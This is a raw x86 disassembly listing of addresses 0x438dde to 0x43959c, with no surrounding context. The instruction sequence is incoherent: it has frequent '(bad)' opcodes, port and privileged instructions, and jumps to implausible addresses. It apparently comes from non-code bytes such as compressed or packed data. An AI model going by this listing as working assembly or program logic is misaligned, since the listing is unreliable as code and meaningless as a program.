  438dde:	dec    BYTE PTR [eax]
  438de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438de1:	add    eax,esp
  438de3:	shl    DWORD PTR [esi],cl
  438de5:	fld    TBYTE PTR [esi]
  438de7:	mov    ah,BYTE PTR [eax+ecx*1]
  438dea:	repz test BYTE PTR [edx-0x4a33c302],0x5b
  438df2:	inc    eax
  438df3:	repz pop ebx
  438df5:	ret    0xd5c7
  438df8:	call   0xfa3efdd5
  438dfd:	mov    al,0x8a
  438dff:	xchg   ebx,eax
  438e00:	cld    
  438e01:	inc    DWORD PTR [eax]
  438e03:	and    edx,DWORD PTR ds:0xc61cfdcb
  438e09:	test   ecx,0x8b53d577
  438e0f:	das    
  438e10:	push   ebp
  438e11:	in     eax,0x10
  438e13:	or     BYTE PTR [ebx+0x0],bh
  438e16:	add    eax,ecx
  438e18:	das    
  438e19:	push   ecx
  438e1a:	mov    ecx,DWORD PTR [ecx-0x33]
  438e1d:	out    dx,eax
  438e1e:	pextrw edi,(bad),0xc5
  438e20:	mov    eax,0x32620000
  438e25:	in     eax,dx
  438e26:	aam    0x8b
  438e28:	ja     0x438e26
  438e2a:	or     bh,bl
  438e2c:	add    DWORD PTR [eax+eax*1],eax
  438e2f:	bound  esi,QWORD PTR [ebp-0x6d041032]
  438e35:	add    eax,DWORD PTR [eax]
  438e37:	(bad)  
  438e38:	(bad)  
  438e3a:	ss daa 
  438e3c:	inc    eax
  438e3d:	jl     0x438e89
  438e3f:	data16 lods al,BYTE PTR ds:[esi]
  438e41:	daa    
  438e42:	mov    ebp,DWORD PTR [edi+0x36d41522]
  438e48:	sbb    DWORD PTR [eax],ebp
  438e4a:	and    DWORD PTR [edx],0x6
  438e4d:	in     eax,0x65
  438e4f:	push   edx
  438e50:	jecxz  0x438e79
  438e52:	xor    ebp,DWORD PTR [edx-0x130036f1]
  438e58:	sub    eax,0x32a21028
  438e5d:	jnp    0x438e27
  438e5f:	out    0x89,eax
  438e61:	mov    ecx,0xf509eb12
  438e66:	xchg   BYTE PTR [eax],al
  438e68:	sub    esp,DWORD PTR [esi]
  438e6a:	aas    
  438e6b:	aas    
  438e6c:	pop    esi
  438e6d:	(bad)  
  438e6e:	bound  eax,QWORD PTR [eax+0x62]
  438e71:	jg     0x438e71
  438e73:	pop    ds
  438e74:	(bad)  
  438e75:	repnz cld 
  438e77:	in     al,0x60
  438e79:	mov    ebx,0xc9a22d3b
  438e7e:	mov    bh,0x7
  438e80:	out    0x9,eax
  438e82:	clc    
  438e83:	xchg   edx,eax
  438e84:	mov    ds:0x378ad19b,al
  438e89:	scas   al,BYTE PTR es:[edi]
  438e8a:	gs lahf 
  438e8c:	bound  esi,QWORD PTR [edx]
  438e8e:	add    al,0xe8
  438e90:	sahf   
  438e91:	fidiv  DWORD PTR [ecx]
  438e93:	stc    
  438e94:	jmp    0x6da98f19
  438e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438e9a:	fpatan 
  438e9c:	jp     0x438e77
  438e9e:	lahf   
  438e9f:	push   edi
  438ea0:	pop    eax
  438ea1:	dec    eax
  438ea2:	pop    ebp
  438ea3:	inc    esp
  438ea4:	rol    DWORD PTR [esi],1
  438ea6:	test   BYTE PTR [edi],dl
  438ea8:	lahf   
  438ea9:	dec    eax
  438eaa:	int    0xbb
  438eac:	retf   0xe99d
  438eaf:	cs push ecx
  438eb1:	inc    ebp
  438eb2:	fcmovb st,st(3)
  438eb4:	xor    eax,0x3088fa53
  438eb9:	int    0xc4
  438ebb:	jl     0x438e45
  438ebd:	shl    DWORD PTR [eax-0x33],1
  438ec0:	imul   esp,DWORD PTR [eax],0x7b7e0820
  438ec6:	sub    al,BYTE PTR [ebx+eiz*1]
  438ec9:	(bad)  
  438ecb:	add    BYTE PTR gs:[edx+0x2a4ed1d9],ah
  438ed2:	inc    esi
  438ed3:	mov    bh,0x7c
  438ed5:	mov    al,ds:0xe701c2e9
  438eda:	dec    ebx
  438edb:	sti    
  438edc:	inc    ebx
  438edd:	(bad)  
  438edf:	icebp  
  438ee0:	mov    al,dl
  438ee2:	xor    ecx,DWORD PTR [edx-0xf]
  438ee5:	adc    eax,0xa4cb2fa8
  438eea:	sbb    bl,dh
  438eec:	add    esi,DWORD PTR [ecx]
  438eee:	push   esp
  438eef:	mov    es,WORD PTR [edx+0x1f6940c6]
  438ef5:	out    0xd8,al
  438ef7:	jmp    0xe209bdff
  438efc:	add    al,0x17
  438efe:	scas   eax,DWORD PTR es:[edi]
  438eff:	jb     0x438f45
  438f01:	xor    edx,DWORD PTR [esp+eax*2+0x7c]
  438f05:	push   ds
  438f06:	std    
  438f07:	cmc    
  438f08:	mov    ch,0x5
  438f0a:	or     al,0x50
  438f0c:	in     al,dx
  438f0d:	cmc    
  438f0e:	shl    BYTE PTR [ebp-0xe3a015c],1
  438f14:	add    edi,ebx
  438f16:	inc    esi
  438f17:	add    DWORD PTR [eax-0x4b],esp
  438f1a:	sti    
  438f1b:	adc    BYTE PTR [eax-0x4b],ah
  438f1e:	sti    
  438f1f:	add    al,0x9f
  438f21:	jno    0x438f7f
  438f23:	dec    esp
  438f24:	icebp  
  438f25:	loop   0x438ed4
  438f27:	sbb    al,0xf9
  438f29:	imul   ebx,eax,0x5c61e8fe
  438f2f:	ins    DWORD PTR es:[edi],dx
  438f30:	int    0x0
  438f32:	push   ecx
  438f33:	les    esi,FWORD PTR [ebp-0xf]
  438f36:	pusha  
  438f37:	retf   
  438f38:	adc    BYTE PTR [edx-0x18],ah
  438f3b:	rol    BYTE PTR [ebp-0x172cc26b],cl
  438f41:	fsub   DWORD PTR [ebp-0x27]
  438f44:	add    BYTE PTR [edx-0x2e],dh
  438f47:	cli    
  438f48:	add    al,0x62
  438f4a:	xor    ebx,ebx
  438f4c:	test   DWORD PTR ds:0xade8eefa,ebx
  438f52:	cdq    
  438f53:	inc    eax
  438f54:	clc    
  438f55:	gs sahf 
  438f57:	int    0x1b
  438f59:	push   ds
  438f5a:	adc    al,0x54
  438f5c:	inc    ebp
  438f5d:	add    eax,0x358b97fe
  438f62:	retf   0x8be6
  438f65:	xor    dh,dl
  438f67:	ds add eax,0x7d407cbc
  438f6d:	test   eax,0xe8b0db0a
  438f72:	pop    edx
  438f73:	inc    edi
  438f74:	xor    ch,BYTE PTR [ecx+0x625ba0a7]
  438f7a:	test   DWORD PTR [edx-0x559e1a3e],esp
  438f80:	mov    edx,DWORD PTR [ebp-0x1d]
  438f83:	xor    eax,0xdec56a05
  438f88:	add    edi,DWORD PTR [edx+0x5b8ba9b7]
  438f8e:	or     ecx,DWORD PTR [esi+0x73]
  438f91:	add    dl,bl
  438f93:	dec    ecx
  438f94:	int    0x39
  438f96:	add    ah,dl
  438f98:	inc    edx
  438f99:	je     0x438fe5
  438f9b:	clc    
  438f9c:	jne    0x438f9e
  438f9e:	add    al,0x0
  438fa0:	cwde   
  438fa1:	jg     0x439000
  438fa3:	jg     0x438f67
  438fa5:	inc    ebx
  438fa6:	cld    
  438fa7:	in     eax,dx
  438fa8:	(bad)  
  438fa9:	stc    
  438faa:	jbe    0x438ff7
  438fac:	(bad)  
  438fad:	dec    ebx
  438fae:	hlt    
  438faf:	arpl   WORD PTR [ebx],sp
  438fb1:	inc    edi
  438fb2:	std    
  438fb3:	fs push ecx
  438fb5:	shl    DWORD PTR [ebp+0x33],0xc2
  438fb9:	pop    ebx
  438fba:	or     eax,eax
  438fbc:	push   ss
  438fbd:	hlt    
  438fbe:	jmp    0x438fd2
  438fc0:	rol    DWORD PTR [ebx-0x4],0x90
  438fc4:	pop    ss
  438fc5:	hlt    
  438fc6:	mov    eax,DWORD PTR [ebp+eax*2+0x48]
  438fca:	push   ebx
  438fcb:	xor    al,0x8c
  438fcd:	add    bh,bh
  438fcf:	lods   eax,DWORD PTR ds:[esi]
  438fd0:	shr    eax,1
  438fd2:	sub    al,0xdd
  438fd4:	repz stc 
  438fd6:	mov    BYTE PTR [esi],bh
  438fd8:	inc    eax
  438fd9:	jge    0x438fa6
  438fdb:	and    esp,DWORD PTR [ebx+edx*4]
  438fde:	push   DWORD PTR [edi+edi*4-0x280ff4bd]
  438fe5:	rcl    BYTE PTR es:[edi+edx*1-0x220636b3],0x0
  438fee:	push   ebp
  438fef:	inc    eax
  438ff0:	out    0x47,al
  438ff2:	and    DWORD PTR [esi+0x45],0xfffffff7
  438ff6:	push   edx
  438ff7:	dec    ebp
  438ff8:	sub    al,0x7d
  438ffa:	fiadd  DWORD PTR [eax]
  438ffc:	inc    eax
  438ffd:	repz or DWORD PTR [edx+0xda20],eax
  439004:	or     BYTE PTR [ebp+0x0],dh
  439007:	add    BYTE PTR [ebp+ebx*2+0x30620098],al
  43900e:	add    al,0x66
  439010:	jb     0x43902c
  439012:	add    al,0xf9
  439014:	aaa    
  439015:	mov    BYTE PTR [ebp+0xf076243],ah
  43901b:	cld    
  43901c:	push   edx
  43901d:	jo     0x439023
  43901f:	test   DWORD PTR [edx-0x44],esi
  439022:	sub    eax,0xbcc77e74
  439027:	pop    es
  439028:	sbb    eax,0xa29bdc3d
  43902d:	xor    bh,BYTE PTR [ebx+0x42]
  439030:	pop    esi
  439031:	sti    
  439032:	mov    ebp,0x4135207
  439037:	add    BYTE PTR ds:0x3c7ff87d,bl
  43903d:	test   DWORD PTR [eiz*8-0x7cd180a0],eax
  439044:	adc    al,0xa7
  439046:	xchg   ebp,eax
  439047:	jl     0x4390c6
  439049:	dec    edx
  43904a:	add    al,0x7d
  43904c:	(bad)  
  43904d:	cmp    bh,ch
  43904f:	mov    eax,0xffbdb94d
  439054:	ja     0x43908d
  439056:	ja     0x43909d
  439058:	pop    esi
  439059:	mov    ch,0xd1
  43905b:	sti    
  43905c:	cli    
  43905d:	jl     0x4390a7
  43905f:	sti    
  439060:	add    ch,ah
  439062:	mov    bh,0xc1
  439064:	sti    
  439065:	cdq    
  439066:	jae    0x439018
  439068:	inc    edi
  439069:	dec    ebx
  43906a:	jb     0x439081
  43906c:	std    
  43906d:	int    0x32
  43906f:	jne    0x4390b3
  439071:	push   esi
  439072:	scas   eax,DWORD PTR es:[edi]
  439073:	test   eax,0x7446007
  439078:	test   DWORD PTR [ecx],ebp
  43907a:	dec    edx
  43907b:	jns    0x4390d0
  43907d:	scas   al,BYTE PTR es:[edi]
  43907e:	pop    edx
  43907f:	pop    edx
  439080:	aad    0xa7
  439082:	mov    bl,0x77
  439084:	inc    ebx
  439085:	sahf   
  439086:	fldenv [edx]
  439088:	inc    ebx
  439089:	pop    es
  43908a:	cld    
  43908b:	rol    BYTE PTR [ebx+0x7a],1
  43908e:	fsubr  st,st(1)
  439090:	add    ebx,ebp
  439092:	fwait
  439093:	loope  0x439113
  439095:	test   al,0x31
  439097:	(bad)  
  439098:	jge    0x439112
  43909a:	inc    esp
  43909b:	pop    ebp
  43909c:	inc    esp
  43909d:	test   bh,0x99
  4390a0:	sub    dl,BYTE PTR [ecx+0x61]
  4390a3:	fadd   st(3),st
  4390a5:	pop    ebp
  4390a6:	je     0x439091
  4390a8:	push   ds
  4390a9:	pop    esp
  4390aa:	push   eax
  4390ab:	loopne 0x43904a
  4390ad:	dec    esp
  4390ae:	dec    edi
  4390af:	and    BYTE PTR [ebx],ch
  4390b1:	jb     0x4390ba
  4390b3:	sub    cl,bl
  4390b5:	fwait
  4390b6:	mov    al,ds:0xd95e4630
  4390bb:	mov    edx,0xe0bba243
  4390c0:	add    al,0xe4
  4390c2:	fsub   st(1),st
  4390c4:	mov    eax,ds:0xebd29e00
  4390c9:	jae    0x4390e0
  4390cb:	sbb    bl,dh
  4390cd:	add    esi,DWORD PTR [ecx-0x17941b0]
  4390d3:	inc    eax
  4390d4:	cmp    DWORD PTR [edi-0x29172e87],eax
  4390da:	xchg   ebx,eax
  4390db:	lods   al,BYTE PTR ds:[esi]
  4390dc:	jb     0x43912b
  4390de:	out    0x41,eax
  4390e0:	aaa    
  4390e1:	add    BYTE PTR [ecx+ebx*1],dh
  4390e4:	ret    
  4390e5:	iret   
  4390e6:	mov    cs,WORD PTR [ebx-0x1f]
  4390e9:	mov    dl,0x61
  4390eb:	into   
  4390ec:	mov    edi,0xe9d8ed9b
  4390f1:	add    esi,DWORD PTR [eax]
  4390f3:	inc    esp
  4390f4:	int    0xbb
  4390f6:	cmp    bl,BYTE PTR [ebp+0x45512ae9]
  4390fc:	fcmovb st,st(3)
  4390fe:	lods   eax,DWORD PTR ds:[esi]
  4390ff:	pop    esp
  439100:	add    DWORD PTR [ecx-0x5e74250b],ebp
  439106:	jns    0x43910d
  439108:	out    0x64,eax
  43910a:	dec    eax
  43910b:	pop    esi
  43910c:	icebp  
  43910d:	jo     0x4390df
  43910f:	xlat   BYTE PTR ds:[ebx]
  439110:	jge    0x439171
  439112:	mov    ch,0x10
  439114:	mov    WORD PTR [esi+0x562f3b7d],ds
  43911a:	dec    edx
  43911b:	inc    edx
  43911c:	jge    0x439147
  43911e:	mov    ebp,0xa33f3484
  439123:	or     ch,BYTE PTR [esi-0x1f]
  439126:	adc    edx,esp
  439128:	neg    ebp
  43912a:	add    ah,cl
  43912c:	pop    esp
  43912d:	dec    eax
  43912e:	in     eax,0x69
  439130:	pop    edx
  439131:	call   0x3bdb094a
  439136:	xchg   esp,eax
  439137:	cmp    DWORD PTR [ebp-0x5fa1c619],esi
  43913d:	push   esi
  43913e:	mov    ds:0x2b5636ac,al
  439143:	and    eax,0x75624d43
  439148:	ret    0xf1e4
  43914b:	pop    edi
  43914c:	fld    DWORD PTR [eax]
  43914e:	cmp    dh,BYTE PTR [eax]
  439150:	stos   BYTE PTR es:[edi],al
  439151:	mov    edx,eax
  439153:	xchg   DWORD PTR [eax-0x2f599c04],ebx
  439159:	jl     0x4391c2
  43915b:	pop    esi
  43915c:	fld    DWORD PTR [eax]
  43915e:	jb     0x43910e
  439160:	into   
  439161:	xor    edx,DWORD PTR [edx-0x5f81eb99]
  439167:	fist   DWORD PTR [esi-0x78]
  43916a:	jmp    0x19cf6ad0
  43916f:	into   
  439170:	pop    ebp
  439171:	jmp    DWORD PTR [ebx+0x10]
  439174:	xlat   BYTE PTR ds:[ebx]
  439175:	add    edi,DWORD PTR [ecx]
  439177:	mov    esi,0x36006d9b
  43917c:	ret    0x74c6
  43917f:	scas   al,BYTE PTR es:[edi]
  439180:	adc    BYTE PTR fs:[ebx+0x2c],dl
  439184:	xor    al,BYTE PTR [eax+0x7f]
  439187:	inc    edi
  439188:	(bad)  
  43918a:	adc    eax,0x40ecff
  43918f:	add    BYTE PTR [eax],dl
  439191:	or     eax,0xd1a7f684
  439196:	jge    0x4391df
  439198:	xchg   DWORD PTR [ecx+0x1de7f002],ebx
  43919e:	clc    
  43919f:	mov    ch,cl
  4391a1:	dec    edx
  4391a2:	jg     0x439202
  4391a4:	mov    ebx,DWORD PTR [ecx+0x50c30842]
  4391aa:	inc    ecx
  4391ab:	add    BYTE PTR [ebp-0x2dfeebe9],al
  4391b1:	pop    ss
  4391b2:	add    al,0xeb
  4391b4:	cmp    ebp,eax
  4391b6:	in     eax,0x85
  4391b8:	push   ebp
  4391b9:	mov    DWORD PTR ds:0xfbf5c68d,esi
  4391bf:	jmp    FWORD PTR [esi+eiz*1]
  4391c2:	inc    edi
  4391c3:	push   0x36
  4391c5:	pavgb  mm2,QWORD PTR [eax]
  4391c8:	aad    0xfa
  4391ca:	stc    
  4391cb:	test   bl,cl
  4391cd:	jno    0x4391d9
  4391cf:	lea    eax,[esi+0x2cfffbee]
  4391d5:	es jge 0x4391a6
  4391d8:	and    ebp,DWORD PTR [esi-0x3ae3007f]
  4391de:	retf   0x4c89
  4391e1:	fld1   
  4391e3:	and    BYTE PTR [edx+0xb85f9f0],al
  4391e9:	jb     0x4391e8
  4391eb:	dec    edi
  4391ec:	cld    
  4391ed:	rcr    BYTE PTR [eax-0x4f2284ee],cl
  4391f3:	add    DWORD PTR [eax],eax
  4391f5:	bound  edx,QWORD PTR [edi-0xa]
  4391f8:	test   BYTE PTR [esi+edx*8+0x3],ah
  4391fc:	test   DWORD PTR [edx+ebx*2-0x1d5dd1ec],esp
  439203:	retf   0x9b54
  439206:	ins    DWORD PTR es:[edi],dx
  439207:	clc    
  439208:	push   DWORD PTR [esi]
  43920a:	mov    bh,0xf
  43920c:	jge    0x43928c
  43920e:	mov    bh,0x82
  439210:	in     al,dx
  439211:	push   esi
  439212:	cmp    al,BYTE PTR [eax+eax*1]
  439215:	xor    DWORD PTR [edx-0x74958c8b],eax
  43921b:	jne    0x4391f3
  43921d:	loope  0x4391b8
  43921f:	std    
  439220:	ins    BYTE PTR es:[edi],dx
  439221:	gs ds inc esp
  439224:	out    0x72,eax
  439226:	das    
  439227:	add    al,0x0
  439229:	retf   0x336
  43922c:	add    BYTE PTR [edx-0x3b],ah
  43922f:	mov    bh,0x23
  439231:	jle    0x4391b5
  439233:	sub    DWORD PTR [ebp+0x5e],ebp
  439236:	out    0x6,eax
  439238:	mov    al,ds:0x83047250
  43923d:	and    bh,BYTE PTR [edi+0x16a68b1d]
  439243:	fmul   QWORD PTR [edi+0x25]
  439246:	push   ds
  439247:	dec    eax
  439248:	or     eax,0x446f32a2
  43924d:	ds jmp 0x4014:0x8277f8cc
  439255:	bound  edi,QWORD PTR [ebx-0x29ff74dc]
  43925b:	(bad)  
  43925c:	in     al,dx
  43925d:	std    
  43925e:	cmc    
  43925f:	xor    ch,bh
  439261:	mov    al,0x5d
  439263:	cwde   
  439264:	add    edi,0xbe7bd76e
  43926a:	mov    DWORD PTR [edx-0x26248369],ecx
  439270:	into   
  439271:	scas   eax,DWORD PTR es:[edi]
  439272:	pop    esp
  439273:	mov    bh,0x6a
  439275:	sub    eax,0x9de2c526
  43927a:	ds inc edx
  43927c:	aam    0xaf
  43927e:	pusha  
  43927f:	shl    BYTE PTR [esi],1
  439281:	inc    ebp
  439282:	(bad)  
  439283:	fcom   QWORD PTR [ebx]
  439285:	(bad)  
  439286:	or     eax,0x1f0260b7
  43928b:	sbb    ebp,esp
  43928d:	not    dl
  43928f:	aad    0xf6
  439291:	jp     0x43922d
  439293:	mov    bh,0x5c
  439295:	inc    esp
  439296:	adc    DWORD PTR [esi],esp
  439298:	sbb    eax,DWORD PTR [eax+eax*1+0x52]
  43929c:	in     al,dx
  43929d:	js     0x4392ad
  43929f:	cmc    
  4392a0:	fldcw  WORD PTR [esp+ecx*8-0x27]
  4392a4:	jmp    0xf6650cac
  4392a9:	sub    BYTE PTR [ebx+0x4e],bl
  4392ac:	pop    esi
  4392ad:	loopne 0x439234
  4392af:	fucomi st,st(1)
  4392b1:	add    esi,DWORD PTR [edx+0x71df9e4e]
  4392b7:	test   eax,0x4e9326da
  4392bc:	pop    esi
  4392bd:	loopne 0x4392bf
  4392bf:	mov    eax,ds:0xba03e9d5
  4392c4:	aad    0xe8
  4392c6:	add    esp,DWORD PTR [edx-0x57]
  4392c9:	add    DWORD PTR [ecx-0x1f],eax
  4392cc:	ds out 0x82,eax
  4392cf:	push   ds
  4392d0:	in     eax,0x64
  4392d2:	inc    ebx
  4392d3:	pop    ebx
  4392d4:	push   esi
  4392d5:	es daa 
  4392d7:	or     eax,DWORD PTR [eax+0x5d]
  4392da:	mov    edi,0xa760f141
  4392df:	inc    ecx
  4392e0:	jmp    0xe5855255
  4392e5:	sahf   
  4392e6:	mov    edi,0xec00e141
  4392eb:	popa   
  4392ec:	fld    DWORD PTR [eax]
  4392ee:	pusha  
  4392ef:	std    
  4392f0:	sti    
  4392f1:	sbb    al,0x6a
  4392f3:	xchg   DWORD PTR [edi],edi
  4392f5:	outs   dx,BYTE PTR ds:[esi]
  4392f6:	clc    
  4392f7:	dec    edx
  4392f8:	fwait
  4392f9:	idiv   BYTE PTR [ecx]
  4392fb:	cmp    edi,esi
  4392fd:	or     BYTE PTR [ecx],bh
  4392ff:	cmp    ecx,DWORD PTR [ebp+0x649e11c]
  439305:	out    dx,eax
  439306:	jle    0x439384
  439308:	push   esp
  439309:	(bad)  
  43930a:	int    0x89
  43930c:	fild   DWORD PTR [eax]
  43930e:	jmp    0xf960202d
  439313:	imul   ecx,esp,0x553c5ee2
  439319:	shl    esi,0xd2
  43931c:	sbb    BYTE PTR [eax-0x51],bl
  43931f:	test   al,0x54
  439321:	fisub  WORD PTR [eax+eax*1-0x38ff2add]
  439328:	loopne 0x439301
  43932a:	adc    BYTE PTR [ecx+0x66],bh
  43932d:	jg     0x43932c
  43932f:	call   0xed4d512b
  439334:	sar    DWORD PTR [esi],1
  439336:	ret    0x61e5
  439339:	stos   DWORD PTR es:[edi],eax
  43933a:	mov    ebx,DWORD PTR [eax]
  43933c:	mov    eax,0x7663fc93
  439341:	lds    ecx,FWORD PTR [edx]
  439343:	jb     0x4393ab
  439345:	mov    bh,0x1
  439347:	(bad)  
  439348:	push   eax
  439349:	mov    esp,0x5461ed5e
  43934e:	inc    edi
  43934f:	loope  0x439333
  439351:	push   ss
  439352:	ins    DWORD PTR es:[edi],dx
  439353:	repz mov bh,BYTE PTR [esi]
  439356:	push   0xffffffe8
  439358:	ds jmp 0x3f41e2e1
  43935e:	push   esi
  43935f:	stos   BYTE PTR es:[edi],al
  439360:	loope  0x43938f
  439362:	popf   
  439363:	add    cl,bh
  439365:	fiadd  DWORD PTR [eax]
  439367:	mov    edi,DWORD PTR [edi+0x39]
  43936a:	lods   al,BYTE PTR ds:[esi]
  43936b:	add    cl,bl
  43936d:	fidivr DWORD PTR [edi+0x4c]
  439370:	pop    edi
  439371:	in     eax,0x7d
  439373:	mov    WORD PTR [edi-0x4400095e],ds
  439379:	pop    ecx
  43937a:	or     edi,edi
  43937c:	jle    0x43935b
  43937e:	push   ebp
  43937f:	test   ch,ah
  439381:	hlt    
  439382:	mov    edx,DWORD PTR [eax-0x1c]
  439385:	pop    edx
  439386:	out    dx,eax
  439387:	inc    DWORD PTR [eax]
  439389:	mov    ah,0xda
  43938b:	add    BYTE PTR [edi],cl
  43938d:	or     al,0x4a
  43938f:	idiv   edi
  439391:	mov    ebp,DWORD PTR [ebx]
  439393:	inc    edi
  439394:	(bad)  
  439395:	xlat   BYTE PTR ds:[ebx]
  439396:	push   ds
  439397:	adc    BYTE PTR [ecx+0x10],dl
  43939a:	rcr    DWORD PTR [eax+edi*4],0x89
  43939e:	fiadd  DWORD PTR [eax]
  4393a0:	mov    edi,DWORD PTR [ebx]
  4393a2:	fisttp QWORD PTR [ebp+0x7df424e7]
  4393a8:	call   0x763d89a5
  4393ad:	inc    ecx
  4393ae:	mov    dl,0xba
  4393b0:	add    BYTE PTR [ebx-0x26],cl
  4393b3:	fist   WORD PTR [eax]
  4393b5:	cmp    bl,dl
  4393b7:	add    BYTE PTR [esi+0x28],dl
  4393ba:	in     al,dx
  4393bb:	sub    ebp,0x44
  4393be:	mov    esi,0xda4b00e9
  4393c3:	inc    ebp
  4393c4:	xor    eax,DWORD PTR [eax-0x4d36dae8]
  4393ca:	and    DWORD PTR [esp+edx*1],0xf6835bfc
  4393d1:	xor    al,0xbf
  4393d3:	iret   
  4393d4:	add    bl,bh
  4393d6:	fnstcw WORD PTR [ebp+0x44]
  4393d9:	pop    edi
  4393da:	sar    DWORD PTR [ebp+0x3c],1
  4393dd:	bound  esi,QWORD PTR [ecx]
  4393df:	jns    0x4393aa
  4393e1:	or     dh,BYTE PTR [ecx]
  4393e3:	js     0x4393df
  4393e5:	in     eax,dx
  4393e6:	lods   al,BYTE PTR ds:[esi]
  4393e7:	inc    ebx
  4393e8:	jp     0x439455
  4393ea:	loope  0x43945b
  4393ec:	dec    esp
  4393ed:	add    BYTE PTR [esi-0x4d7b2cd8],al
  4393f3:	mov    edx,0x697ae82c
  4393f8:	sbb    eax,0xe0f3dbf9
  4393fd:	psraw  mm4,QWORD PTR [edi+0x1d]
  439401:	or     esi,ebx
  439403:	xchg   ebp,eax
  439404:	add    eax,DWORD PTR [eax]
  439406:	bound  ebp,QWORD PTR [ebp-0x7ceb8bbd]
  43940c:	sbb    eax,0x6f6ed509
  439411:	push   esp
  439412:	ds adc al,0x96
  439415:	test   BYTE PTR [esi-0x13],bl
  439418:	and    eax,DWORD PTR [edx+0x671c3022]
  43941e:	xor    DWORD PTR [ebp-0x2be17ae4],esp
  439424:	adc    BYTE PTR [esi+0x6d],ah
  439427:	retf   0x8afb
  43942a:	push   cs
  43942b:	aam    0xd4
  43942d:	out    0x65,eax
  43942f:	repz sbb eax,0xa7f2dff9
  439435:	inc    eax
  439436:	mov    eax,0xbc57b5d7
  43943b:	aaa    
  43943c:	sub    al,0x6e
  43943e:	sub    al,0xb8
  439440:	ja     0x439466
  439442:	div    BYTE PTR [eax]
  439444:	add    al,0x0
  439446:	mov    eax,0x6961cb37
  43944b:	fldenv [esi+0x3efdc00]
  439451:	add    BYTE PTR [eax],al
  439453:	bound  edi,QWORD PTR [ecx-0x26597af5]
  439459:	add    eax,0xfd8ddef4
  43945e:	mul    esi
  439460:	sub    edx,eax
  439462:	sar    BYTE PTR ss:[edi+eax*8],cl
  439466:	(bad)  
  439467:	sahf   
  439468:	cmc    
  439469:	loope  0x4393f1
  43946b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43946c:	aad    0x2a
  43946e:	lea    ebp,[esi]
  439470:	cmc    
  439471:	rcl    DWORD PTR [eax+0x48f33c97],1
  439477:	pop    ebx
  439478:	push   edi
  439479:	xor    eax,0x933ccb23
  43947e:	fldcw  WORD PTR [edx-0x7c]
  439481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439482:	(bad)  
  439483:	pop    esi
  439484:	push   ss
  439485:	jle    0x439411
  439487:	and    bl,cl
  439489:	fs inc esp
  43948b:	test   DWORD PTR cs:[edi-0x68],esi
  43948f:	inc    ecx
  439490:	jmp    0xe1854cf7
  439495:	(bad)  
  439496:	rol    BYTE PTR [ecx-0xb],1
  439499:	pop    esi
  43949a:	xor    al,0xde
  43949c:	sbb    DWORD PTR [ebx-0x78],esi
  43949f:	inc    esi
  4394a0:	jge    0x43948e
  4394a2:	add    esp,DWORD PTR [edx-0x3a]
  4394a5:	mov    esp,DWORD PTR [edx-0x54]
  4394a8:	fldl2t 
  4394aa:	add    ebx,ebp
  4394ac:	loope  0x439500
  4394ae:	jge    0x4394c8
  4394b0:	jnp    0x43949c
  4394b2:	add    esp,DWORD PTR [edx-0x64]
  4394b5:	xchg   edx,eax
  4394b6:	mov    es,WORD PTR [eax]
  4394b8:	sahf   
  4394b9:	cmc    
  4394ba:	cmc    
  4394bb:	mov    ?,WORD PTR [ecx]
  4394bd:	xor    DWORD PTR [edi-0x77c3c48d],ecx
  4394c3:	mov    fs,WORD PTR [eax]
  4394c5:	fwait
  4394c6:	add    cl,BYTE PTR [ecx]
  4394c8:	jmp    0x689e:0x6203ea18
  4394cf:	dec    eax
  4394d0:	(bad)  
  4394d1:	(bad)  
  4394d2:	add    cl,ch
  4394d4:	popa   
  4394d5:	jnp    0x4394e0
  4394d7:	jmp    0x6b28e9a6
  4394dc:	xor    eax,0x153653e1
  4394e1:	jl     0x439517
  4394e3:	mov    dl,0xe9
  4394e5:	lahf   
  4394e6:	call   0xac765747
  4394eb:	xchg   edx,eax
  4394ec:	je     0x439564
  4394ee:	pop    edi
  4394ef:	xchg   edx,eax
  4394f0:	bswap  esp
  4394f2:	stos   BYTE PTR es:[edi],al
  4394f3:	sbb    bl,dh
  4394f5:	xchg   edi,eax
  4394f6:	call   0x552c1614
  4394fb:	jmp    DWORD PTR [ecx+0x6da5833b]
  439501:	push   eax
  439502:	inc    esi
  439503:	xchg   ebp,eax
  439504:	out    0x9f,al
  439506:	hlt    
  439507:	or     edx,0xdde900d8
  43950d:	sbb    BYTE PTR [esi-0x1a],ch
  439510:	cmp    DWORD PTR [ecx+eax*1-0x17],edi
  439514:	popa   
  439515:	adc    bl,BYTE PTR ss:[edx+esi*4+0x33]
  43951a:	jmp    0x3bd495b3
  43951f:	clc    
  439520:	gs and ebp,eax
  439523:	or     dl,BYTE PTR [ecx-0x16ff2700]
  439529:	push   eax
  43952a:	mov    al,cl
  43952c:	push   edx
  43952d:	outs   dx,BYTE PTR ds:[esi]
  43952e:	dec    esi
  43952f:	inc    esi
  439530:	push   ecx
  439531:	mov    edx,ecx
  439533:	pop    es
  439534:	jmp    0xb504ea9a
  439539:	pop    ecx
  43953a:	xor    DWORD PTR [edi+0x7d961e9],0x464e7956
  439544:	adc    eax,0xe8fff689
  439549:	popa   
  43954a:	mov    bh,0x8b
  43954c:	add    BYTE PTR [eax+0x17],bh
  43954f:	dec    ebp
  439550:	leave  
  439551:	dec    eax
  439552:	push   ecx
  439553:	shl    BYTE PTR [esi+eiz*1-0x18],0xb1
  439558:	add    ebp,esp
  43955a:	push   ecx
  43955b:	shl    DWORD PTR [esi+ebx*2+0x54],0xf9
  439560:	xor    BYTE PTR [esi+0x4ab70944],dl
  439566:	shl    DWORD PTR [ebp-0x8],cl
  439569:	xchg   ebx,eax
  43956a:	popa   
  43956b:	add    eax,DWORD PTR [ebx+0x5737e23]
  439571:	mov    dl,0xe7
  439573:	add    BYTE PTR [eax],al
  439575:	retf   
  439576:	out    dx,eax
  439577:	xchg   BYTE PTR [eax],al
  439579:	mov    ebx,0x71c025d6
  43957e:	int    0x62
  439580:	mov    DWORD PTR [eax],eax
  439582:	leave  
  439583:	jle    0x43953a
  439585:	push   ebx
  439586:	inc    eax
  439587:	sti    
  439588:	or     ecx,0x57
  43958b:	pop    ebp
  43958c:	or     DWORD PTR [edi-0x3f7c8f46],esi
  439592:	xchg   edi,eax
  439593:	and    ax,0x74d2
  439597:	dec    esp
  439598:	out    dx,eax
  439599:	adc    DWORD PTR [ebx],0x25
  43959c:	jae    0x4395b1
